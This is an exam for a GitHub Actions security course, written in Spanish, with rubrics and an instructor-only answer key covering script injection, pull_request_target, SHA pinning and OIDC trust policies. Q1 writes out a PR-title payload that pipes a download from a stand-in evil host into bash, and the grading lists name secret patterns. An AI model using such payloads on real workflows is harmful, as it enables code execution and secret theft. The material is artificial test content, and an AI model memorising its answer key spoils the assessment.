# Examen de certificación — GitHub Actions

- **Curso:** `github-actions` (módulos `gha-01` … `gha-15`).
- **Nivel:** intermedio-avanzado (foco en `gha-06` … `gha-15`, prerrequisitos `gha-01` … `gha-05`).
- **Dimensión:** todas (conceptual + operativa + arquitectónica).
- **Duración:** 90–120 min take-home + 30 min live follow-up con instructor.
- **Entorno:** take-home local (bash, python3, docker, opcional actionlint/zizmor/cosign/syft).
  La fase live se evalúa en videollamada con share de pantalla; el instructor puede
  pedir modificaciones en caliente sobre el entregable.
- **Umbral de aprobación:** **70 %** ponderado + ninguna red flag (ver §6 y `competency-matrix.yaml`).
- **Idioma:** prosa en español, código / YAML / nombres de archivo en inglés.

Archivos relacionados:

```
02-github-actions/
├── EXAM.md                        ← este documento
├── competency-matrix.yaml         ← pesos, dimensiones, red flags descalificantes
├── operative/
│   ├── starter/                   ← workflow vulnerable que debe endurecerse
│   └── validate/run.sh            ← validación local sin red
└── architectural/scenario.md      ← escenario para el ejercicio de diseño
```

---

## 1. Matriz de competencias evaluadas

Fuente autoritativa: [`competency-matrix.yaml`](./competency-matrix.yaml). Resumen:

| ID  | Competencia (verbo + resultado observable)                                                     | Dimensión               | Peso |
|-----|------------------------------------------------------------------------------------------------|-------------------------|------|
| C1  | Explicar script injection vía `${{ … }}` en `run:` y mitigar por indirección a `env`           | conceptual              | 7    |
| C2  | Distinguir `pull_request` vs `pull_request_target` y justificar aislamiento                    | conceptual              | 8    |
| C3  | Defender pin a SHA sobre tags mutables con evidencia de incidente                              | conceptual              | 6    |
| C4  | Diseñar `permissions:` mínimas por workflow y escalada selectiva por job                       | conceptual + operativa  | 8    |
| C5  | Razonar `concurrency` + `cancel-in-progress` en deploys y elegir política por environment      | conceptual              | 6    |
| C6  | Diagnosticar un *cache miss* y defender cuándo un miss es preferible a un hit falso            | conceptual + operativa  | 6    |
| C7  | Decidir composite action vs reusable workflow con criterio de permisos y runner                | arquitectónica          | 7    |
| C8  | Modelar dev→staging→prod con environments, approvals, branch rules y claim OIDC                | arquitectónica + oper.  | 10   |
| C9  | Auditar un trust policy OIDC vulnerable y escribir uno restrictivo por repo + env              | conceptual + operativa  | 8    |
| C10 | Decidir hosted vs self-hosted (ARC) y detectar cuándo self-hosted es incorrecto                | arquitectónica          | 7    |
| C11 | Producir y verificar SBOM + attestation + firma cosign keyless sobre imagen publicada a GHCR   | operativa + conceptual  | 9    |
| C12 | Diseñar el *platform contract* org-level (required workflows via rulesets, cost governance)    | arquitectónica          | 10   |
| C13 | Diseñar pipeline fan-out/fan-in con `matrix`, `needs` y artefactos                              | operativa               | 8    |

Ponderación por bloque: conceptual **35**, operativa **35**, arquitectónica **30**. Total **100**.

---

## 2. Preguntas conceptuales (35 pts)

Formato libre, respuesta corta (3–8 líneas por pregunta). Se evalúa comprensión,
no formato. Peso individual indicado al final de cada pregunta.

### Q1 — Script injection en `run:` (C1, 5 pts)

Dado el fragmento:

```yaml
- name: Comment PR
  run: |
    echo "New PR: ${{ github.event.pull_request.title }}"
```

Un atacante abre un PR con título:

```
"; curl -s https://evil.sh | bash #
```

**(a)** Explica en qué momento del lifecycle del step se materializa la inyección y por qué `GITHUB_TOKEN` no sirve de barrera.
**(b)** Reescribe el step con la mitigación canónica y explica por qué funciona.

---

### Q2 — `pull_request_target` vs `pull_request` (C2, 6 pts)

El equipo quiere ejecutar linters contra PRs de **forks** y publicar un comentario en el PR,
pero `secrets.SONAR_TOKEN` no está disponible con `pull_request`.
Un junior propone cambiar el trigger a `pull_request_target` y añadir
`with: ref: ${{ github.event.pull_request.head.sha }}` al checkout.

**(a)** ¿Qué garantiza GitHub con cada uno de los dos triggers respecto a secretos y permisos?
**(b)** ¿Qué garantiza y qué deja de garantizar el cambio propuesto por el junior?
**(c)** Describe un patrón seguro que preserve el objetivo (lintear + comentar) sin ejecutar código del PR con los secretos cargados.

---

### Q3 — Pin a SHA vs tag (C3, 4 pts)

Un reviewer rechaza tu PR porque usas `uses: tj-actions/changed-files@v41`.
**(a)** Explica el modelo de amenaza concreto que resuelve pinnear a SHA, con referencia al incidente público de esa misma action.
**(b)** ¿Qué protección adicional da pinnear a SHA si el repo upstream es *rotated* (owner cambia)? ¿Y qué no protege?

---

### Q4 — `permissions:` y escalada (C4, 4 pts)

Un workflow declara, a nivel top:

```yaml
permissions: write-all
```

y uno de sus jobs sólo necesita leer código y escribir un comentario de check.

**(a)** ¿Qué dos ejes de riesgo multiplica este `write-all`?
**(b)** Reescribe el bloque `permissions:` con el principio de mínimo privilegio aplicando escalada selectiva por job. Explica por qué nunca se declara `permissions: {}` global si algún job necesita permisos.

---

### Q5 — `concurrency` en deploys (C5, 4 pts)

Un pipeline tiene:

```yaml
concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: true
```

Dos pushes a `main` se encolan con 10 s de diferencia; el primero ya pasó `terraform apply`
y está en `kubectl rollout`.

**(a)** ¿Qué le pasa al primer run y qué efectos operacionales tiene sobre el cluster?
**(b)** ¿Qué política de concurrency elegirías para **staging** vs **production** y por qué son distintas?

---

### Q6 — Cache miss (C6, 4 pts)

`actions/cache` con `key: pip-${{ hashFiles('**/requirements.txt') }}` y
`restore-keys: | pip-` restauró una caché "cercana" en una rama donde los tests fallan de forma intermitente.

**(a)** Lista tres razones distintas por las que podrías preferir que la caché **falle (miss)** antes que que haga hit parcial.
**(b)** Diseña el par `key` / `restore-keys` que uses en una pipeline donde correctness > velocidad.

---

### Q7 — Composite vs reusable workflow (C7, 4 pts)

Tienes 20 repos que repiten los mismos 6 pasos (`setup-python`, `poetry install`, `lint`, `test`, `coverage upload`, `job summary`).
Debate entre encapsularlo como **composite action** o como **reusable workflow**.

**(a)** Para cada opción, indica una propiedad que la otra no puede ofrecer.
**(b)** Si el paso de deploy necesita permisos distintos a los del paso de test, ¿qué opción es forzosamente la correcta y por qué?

---

### Q8 — Trust policy OIDC (C9, 4 pts)

Te muestran esta condición de un rol AWS asumible por GitHub Actions:

```json
"Condition": {
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:acme/*:*"
  }
}
```

**(a)** Describe un escenario concreto en el que esta política permita a un repo
distinto del esperado asumir el rol.
**(b)** Escribe la versión endurecida que exige repo específico y despliegue sólo desde el environment `production`.

---

## 3. Ejercicio operativo (35 pts)

**Entregable:** reemplazar el workflow vulnerable de
[`operative/starter/.github/workflows/ci.yml`](./operative/starter/.github/workflows/ci.yml)
por una versión endurecida, más un `ADR.md` y `supply-chain.md`.

**Validación local:** `operative/validate/run.sh <ruta-entregable>` debe terminar con `fail=0`.
El script no requiere acceso a GitHub ni a AWS; opera por grep/awk, con *soft checks*
adicionales si `actionlint`/`zizmor` están instalados.

**Tareas (mapeadas a competencias):**

| ID        | Tarea                                                                                              | Comp. |
|-----------|----------------------------------------------------------------------------------------------------|-------|
| OP-task-1 | Eliminar la vulnerabilidad de script injection usando indirección por `env:`.                      | C1    |
| OP-task-2 | Reemplazar `pull_request_target` por el patrón correcto (o aislarlo sin ejecutar código del PR).   | C2    |
| OP-task-3 | Pinnear **todas** las actions de terceros a commit SHA con comentario de versión. Añadir Dependabot. | C3    |
| OP-task-4 | Declarar `permissions:` top-level mínimas y escalar por job sólo lo necesario.                     | C4    |
| OP-task-5 | Añadir cache correcta (clave por lockfile, scope por rama).                                        | C6    |
| OP-task-6 | Introducir `environment: production` con approval y `concurrency` por environment.                 | C8    |
| OP-task-7 | Migrar el deploy a OIDC + `role-to-assume`; eliminar `AWS_ACCESS_KEY_ID` del repo.                 | C9    |
| OP-task-8 | Añadir SBOM (`anchore/sbom-action` o `syft`) + `actions/attest-build-provenance` + firma cosign keyless y publicar a GHCR. Documentar el verify en `supply-chain.md`. | C11 |
| OP-task-9 | Reestructurar como fan-out/fan-in: `test` matricial → `build` único → `deploy` con `needs:` y artefactos entre fases. | C13 |

**Validación automática (resumen de checks en `validate/run.sh`):**

- Red flags duras: `permissions: write-all`, secretos literales (`AKIA…`, `ghp_…`, `BEGIN PRIVATE KEY`), `pull_request_target` + checkout del head, interpolación de `github.event.*` dentro de `run:`.
- Pins: ninguna línea `uses: owner/repo@vX` sin SHA.
- `permissions:` top-level presente.
- OIDC: `id-token: write` + `role-to-assume` y sin `AWS_*_KEY`.
- `environment: production` + `concurrency:` presentes.
- Supply chain: SBOM + attestation + cosign.
- `ADR.md` menciona `pull_request_target`, `pinning`, `OIDC`, `permissions`, `concurrency`.

---

## 4. Ejercicio arquitectónico (30 pts)

Enunciado completo en [`architectural/scenario.md`](./architectural/scenario.md).

**Resumen:** diseñar la plataforma de CI/CD de **Acme Corp** (60 devs, 45 repos,
despliegues a EKS, SDK público, presupuesto USD 3k/mes, cluster EKS "ci-runners"
underutilizado). El entregable incluye diagrama, ADR con ≥ 5 decisiones, tabla
de trade-offs *DX / Seguridad / Costo*, SLOs del pipeline y plan de rollout 6
semanas.

**El ADR debe responder explícitamente** (ver scenario §Preguntas):

1. ¿Por qué `repo:acme/*:*` como `sub` claim es inseguro?
2. ¿Qué pasa si GitHub.com está caído durante una ventana de release?
3. ¿Cómo evitas que `@v1` de un reusable workflow sea manipulado?
4. ¿Por qué el SDK público no debe usar self-hosted ni `pull_request_target` con checkout del head?
5. ¿Cómo verifica un consumidor externo la attestation sin acceso a la org?

---

## 5. Rúbrica

### 5.1 Rúbrica — Preguntas conceptuales

Aplicable a Q1…Q8. Cada pregunta se puntúa con la escala siguiente,
luego se escala al peso de la pregunta.

| Criterio                        | Insuficiente (0)                             | Básico (1)                                     | Competente (2)                                     | Experto (3)                                                        |
|---------------------------------|----------------------------------------------|------------------------------------------------|----------------------------------------------------|--------------------------------------------------------------------|
| Precisión conceptual            | Confunde concepto base                        | Nombra el concepto, falla el "por qué"          | Explica el "por qué" sin ambigüedad                  | Explica el "por qué" y los límites del concepto                      |
| Razonamiento / contraejemplo    | No ofrece ninguno                             | Ejemplo genérico                                | Ejemplo específico y correcto                        | Ejemplo + contraejemplo + condición de aplicación                    |
| Mitigación / respuesta aplicada | Ausente o incorrecta                          | Mitigación genérica                             | Mitigación específica y correcta                     | Mitigación + justificación de por qué otras no bastan                |

Puntaje por pregunta = `(suma criterios / 9) × peso_pregunta`.

### 5.2 Rúbrica — Ejercicio operativo (35 pts)

Peso por tarea: `OP-task-1..9` reparten los 35 pts proporcionalmente a la
competencia asociada (ver `competency-matrix.yaml` → `weight`). Cada tarea
se puntúa 0–3:

| Criterio               | Insuficiente (0)                                        | Básico (1)                                           | Competente (2)                                            | Experto (3)                                                                 |
|------------------------|---------------------------------------------------------|------------------------------------------------------|-----------------------------------------------------------|-----------------------------------------------------------------------------|
| Correctness            | La tarea no se completó o introduce nueva vulnerabilidad | Se completó pero falla alguno de los checks           | Pasa todos los checks relevantes de `validate/run.sh`      | Pasa checks + aplica medida adicional razonada (p. ej. Harden-Runner)       |
| Seguridad              | Red flag presente                                        | Sin red flag; sin least-privilege por job            | Least-privilege por job, pins a SHA, OIDC correcto         | + trust policy con claim de environment, concurrency por env, approvals      |
| Mantenibilidad         | Workflow ilegible, lógica duplicada                      | Legible pero no reutilizable                          | Lógica reusable extraída (composite o reusable workflow)   | Reusable + versionado + comentario de rollback                              |
| Justificación (`ADR.md`) | No existe                                              | Lista cambios sin "por qué"                           | Un ADR por decisión mayor con contexto/decisión/consecuencias | + sección "cómo se revierte" + alternativas descartadas con razón           |

**Umbral operativo:** `validate/run.sh` debe terminar con `fail=0`.
Tareas que fallen `validate` reciben a lo sumo 1 punto por "Correctness".

### 5.3 Rúbrica — Ejercicio arquitectónico (30 pts)

| Criterio          | Insuficiente (0)                                      | Básico (1)                                         | Competente (2)                                                       | Experto (3)                                                                               |
|-------------------|-------------------------------------------------------|----------------------------------------------------|----------------------------------------------------------------------|-------------------------------------------------------------------------------------------|
| Cobertura         | Falta ≥ 2 requisitos duros                             | Falta 1 requisito duro                              | Cubre todos los requisitos duros                                      | + cubre los 5 "qué pasa si" explícitos                                                      |
| Trade-offs        | Afirmaciones sin trade-off                             | Trade-offs mencionados en una dimensión             | Trade-offs cruzados DX/Seguridad/Costo                                | + cuantifica trade-offs (minutos, USD, p95) con fuente                                      |
| Seguridad         | Red flag en el diseño                                  | Sin red flag; OIDC presente pero genérico           | OIDC con claim por env + rulesets + required workflows                | + plan de respuesta a incidente supply chain + runbook de rotación                          |
| Operabilidad      | No considera on-call / caídas de GitHub                | Menciona superficialmente                           | Plan de contingencia explícito                                        | + SLO/SLA del pipeline + MTTR objetivo + ejercicio simulado                                 |
| Coste             | Sin estimación                                         | Estimación agregada                                 | Estimación por repo + decisión hosted/ARC justificada numéricamente   | + presupuesto por squad + alerta de guardrail + plan de reducción                           |

**Pesos:** Cobertura 20 %, Trade-offs 20 %, Seguridad 25 %, Operabilidad 15 %, Coste 20 %.

### 5.4 Umbral y mención

- **Aprobado:** ≥ 70 % ponderado total **y** ninguna red flag descalificante.
- **Aprobado con distinción:** ≥ 85 % y evidencia de pensamiento sistémico
  (p. ej. plan de rollback de la plataforma, no sólo del app).
- **No aprobado:** < 70 %, o cualquier red flag de `competency-matrix.yaml:fail_regardless_of_score`,
  independientemente del score.

---

## 6. Guía de corrección (instructor-only)

### 6.1 Respuestas modelo (conceptual)

**Q1.** (a) La interpolación `${{ … }}` se evalúa en **preparación del step**,
antes de generar el script bash; el runner escribe el título del PR literalmente
en el `.sh` temporal, así que `";` cierra el `echo` y el shell ejecuta `curl | bash`
con los secretos del env del job. `GITHUB_TOKEN` no protege porque la ejecución
ocurre en el runner, con acceso a todo el environment del job.
(b) Mitigación canónica — pasar el valor por `env:` y referenciarlo con `"$VAR"`:

```yaml
- name: Comment PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "New PR: $PR_TITLE"
```

Funciona porque el valor viaja por variable de entorno (no por sustitución textual),
y las comillas dobles alrededor evitan word-splitting.
Deben aparecer: *momento de evaluación*, *cómo se materializa en el .sh*,
*env indirection + quoting*.

**Q2.** (a) `pull_request`: checkout del head del PR, **sin** secretos del repo,
`GITHUB_TOKEN` con permisos reducidos. `pull_request_target`: checkout del **base**
(default branch), **con** secretos, con `GITHUB_TOKEN` del repo.
(b) El cambio del junior anula la garantía de aislamiento: ejecuta el código del PR
*con* los secretos cargados. Equivale a dar RCE a cualquier contribuidor externo.
(c) Patrón seguro: `pull_request` para lintear (sin secretos), más un segundo workflow
`workflow_run` triggered por el primero que publica el comentario; o
`pull_request_target` **sin** checkout del head, usando sólo metadata del evento.

**Q3.** (a) Los tags de Git son punteros mutables; owner comprometido puede
re-apuntar `@v41` a un commit malicioso. El incidente de `tj-actions/changed-files`
(2025) demostró exactamente esto: un token comprometido reescribió el tag,
y todos los consumidores sin pin a SHA ejecutaron el payload en su siguiente run.
Pin a SHA ancla el bytecode exacto, inmutable.
(b) Pin a SHA protege de reescritura de tag, pero **no** de un SHA ya malicioso
que el equipo pin eó sin auditar, ni de dependencias transitivas del propio código
de la action. Dependabot + diff del commit cierran parte del gap.

**Q4.** (a) Multiplica el *blast radius* del `GITHUB_TOKEN` (quien comprometa
cualquier step tiene write a packages, deployments, actions, etc.) y la
*superficie de supply chain* (cualquier action maliciosa invocada hereda esos
permisos). (b):

```yaml
permissions:
  contents: read

jobs:
  comment:
    permissions:
      contents: read
      pull-requests: write
      checks: write
    runs-on: ubuntu-latest
```

Nunca `{}` global porque desactiva al token completamente; mejor `contents: read` por default y escalar lo mínimo por job.

**Q5.** (a) El segundo run cancela al primero: `kubectl rollout` queda a medias,
dejando pods de la versión N y N+1 coexistiendo con posible estado inconsistente
(migraciones, flags). (b) Staging: `cancel-in-progress: true` acepta pérdida por
velocidad. Production: `cancel-in-progress: false` + cola, para que ningún deploy
muera a medias; alternativamente lock por `environment` para serializar sin
cancelar.

**Q6.** (a) (1) Lockfile cambió pero el `restore-keys` cae a una caché con una
versión de dep antigua que oculta un bug fixed en la nueva; (2) caché construida
en otro OS/arch de la matriz contamina el run; (3) wheels compiladas contra
system libraries de un runner distinto (p. ej. musl vs glibc). (b):

```yaml
- uses: actions/cache@<SHA>
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ matrix.python-version }}-${{ hashFiles('**/requirements.txt','**/poetry.lock') }}
    # Sin restore-keys cuando correctness > velocidad.
```

**Q7.** (a) Composite: se **expande dentro del job** (comparte runner, env,
pasos de cache), más barata. Reusable workflow: **jobs propios**, puede
declarar sus propios `runs-on`, `permissions`, `environment`, `concurrency` y
tener secretos distintos. (b) Si el deploy necesita permisos distintos a los
del test, debe ser **reusable workflow**: una composite no puede cambiar los
`permissions:` del job que la invoca (hereda los de ese job).

**Q8.** (a) `repo:acme/*:*` permite a **cualquier** repo privado o público
bajo `acme/` asumir el rol; si un repo público existe con el mismo owner, un
PR externo que corra en él (o un fork con workflows habilitados) podría obtener
credenciales. También acepta cualquier branch o environment. (b):

```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:acme/payments-api:environment:production"
  }
}
```

### 6.2 Operativo — solución de referencia (sketch)

El evaluador no comparte la solución con el estudiante. Un workflow aceptable
contiene como mínimo:

- `on: pull_request` (sin `pull_request_target`) + `push: branches: [main]` + `workflow_dispatch`.
- `permissions: contents: read` top-level; `pull-requests: write` sólo en el job que comenta; `id-token: write` + `packages: write` sólo en build/push; `contents: read` + `id-token: write` en deploy.
- Todas las actions pinneadas: `uses: actions/checkout@<40-hex-sha>  # v4.2.2`.
- `.github/dependabot.yml` con `package-ecosystem: "github-actions"`.
- `env: PR_TITLE` para interpolar inputs del evento.
- `actions/setup-python` con `cache: pip` **o** `actions/cache` con key por `hashFiles` del lockfile.
- Job `build-and-push`: `docker/metadata-action` con tags inmutables (sha + semver), `docker/build-push-action` con `provenance: true`, `anchore/sbom-action`, `actions/attest-build-provenance`, `sigstore/cosign-installer` + `cosign sign --yes`.
- Job `deploy`: `environment: production`, `concurrency: { group: deploy-prod, cancel-in-progress: false }`, `aws-actions/configure-aws-credentials` con `role-to-assume: arn:aws:iam::...:role/gha-deploy-prod` sin `aws-access-key-id`.
- Fan-out/fan-in: `test` matricial → `build-and-push` único → `deploy` con `needs: [build-and-push]`, pasando `image-digest` como job output.

### 6.3 Errores comunes y cómo puntuarlos

| Error observado                                                                                 | Puntuación                                                       |
|-------------------------------------------------------------------------------------------------|------------------------------------------------------------------|
| "Soluciona" el script injection removiendo el `echo` entero                                      | 1/3 en Correctness: elimina el síntoma pero no demuestra el patrón |
| Pin a SHA sólo en algunas actions                                                                | 0 en Seguridad para OP-task-3                                     |
| Mantiene `AWS_SECRET_ACCESS_KEY` como fallback "por si OIDC falla"                               | Red flag — 0 total en OP-task-7                                   |
| Añade `environment: production` pero sin branch deployment rule / approval                       | 1/3 en Correctness para OP-task-6                                 |
| Firma la imagen pero no documenta el `cosign verify-attestation` en `supply-chain.md`            | 2/3 en OP-task-8 (le falta "demostrar verificación")              |
| Usa `restore-keys: pip-` sin explicar por qué (en ADR o comentario)                              | 1/3 en Mantenibilidad para OP-task-5                              |
| ADR es una lista de bullets sin "por qué" ni "alternativas"                                      | 1/3 en Justificación                                              |
| Workflow reorganizado como fan-out/fan-in pero comparte estado por filesystem (sin `upload-artifact`) | 1/3 en Correctness para OP-task-9 — no es realmente fan-in       |

### 6.4 Señales de "respondió sin entender"

- Copia-pega de ejemplos oficiales con nombres sin renombrar (`your-registry`, `my-app`).
- `pin-to-sha` sólo en una action "porque el linter se queja"; el resto queda en `@v*`.
- Explica `concurrency` como "ejecuta en paralelo" (es exactamente lo contrario).
- Usa `pull_request_target` + checkout del head "porque así hace el tutorial X".
- ADR dice "elegimos OIDC porque es más seguro" sin mencionar claims.
- En el arquitectónico, menciona ARC sin discutir aislamiento, o afirma "self-hosted es más barato" sin número.

### 6.5 Red flags (descalifican el bloque entero)

Recogidas también en `competency-matrix.yaml:fail_regardless_of_score`:

1. **Secreto hardcodeado** en workflow, ADR o commit del entregable.
2. **Trust policy OIDC** con `sub` igual a `repo:owner/*:*` o `repo:owner/*:ref:*`.
3. **`pull_request_target`** + `actions/checkout` con `ref: ${{ github.event.pull_request.head.sha }}` y `run:` ejecutando código del checkout.
4. **`permissions: write-all`** en el workflow endurecido.
5. **Cualquier action de terceros sin pin a SHA** en el entregable (actions oficiales `actions/*` son tolerables si así lo documenta el ADR, pero las de terceros no).
6. **cluster-admin / `*` IAM policies** en el ejercicio arquitectónico sin justificación explícita.
7. **`curl … | bash`** desde fuente no verificada dentro de cualquier step.

### 6.6 Preguntas de seguimiento para la fase live (30 min)

El instructor elige 3–5 según el entregable. Deben distinguir memorización
de comprensión; se puntúan **cualitativamente** y pueden mover la nota ±5 pts.

1. "Enséñame un diff mínimo que **introduzca** el script injection de vuelta sin romper los otros checks. ¿Qué línea exactamente lo activa?"
2. "Supón que el `cosign verify-attestation` del consumidor falla con `no matching attestations: SubjectAlternativeName mismatch`. ¿Qué parte del flujo investigas primero y por qué?"
3. "Rompe tu propio OIDC: dame un cambio al workflow que haga que el `role-to-assume` falle **sólo** cuando el deploy viene de la rama `release/*`. ¿Qué claim tocas?"
4. "Imagina que GitHub.com está caído a mitad de un release de producción. Describe los 3 primeros comandos que corres y qué estado dejas documentado."
5. "Explícame por qué un reusable workflow publicado como `@v1` sigue siendo vulnerable aunque los consumidores pin eén a SHA el `uses:` del `workflow_call`."
6. "¿En qué condiciones elegirías **composite** aunque los pasos tengan distintos requerimientos de permisos? ¿Qué compromiso aceptas?"
7. "Tu matriz actual es `python: [3.11, 3.12] × os: [ubuntu-latest, macos-latest]`. ¿Qué dos filas excluirías y por qué, dado el ejercicio operativo?"

**Interpretación:** si el estudiante no puede responder al menos 3 con precisión,
baja un escalón de la rúbrica final aunque el score numérico sea alto; es señal
de que el entregable fue producido sin comprensión profunda.

---

## 7. Cómo entregar

1. Fork / clona el repo con tu solución.
2. Coloca:
   - `.github/workflows/ci.yml` endurecido en la raíz de tu solución.
   - `ADR.md` cubriendo (como mínimo) `pull_request_target`, pinning, OIDC, permissions, concurrency.
   - `supply-chain.md` con el comando y output esperado de `cosign verify-attestation`.
   - Respuestas de §2 en `answers.md` (prosa en español).
   - Entregable del arquitectónico en `architecture/` (diagrama + ADR + trade-offs + SLOs + rollout).
3. Corre `operative/validate/run.sh <ruta-de-tu-solucion>` y adjunta el output.
4. Agenda la sesión live (30 min) con el instructor; prepárate para modificar el workflow en vivo.
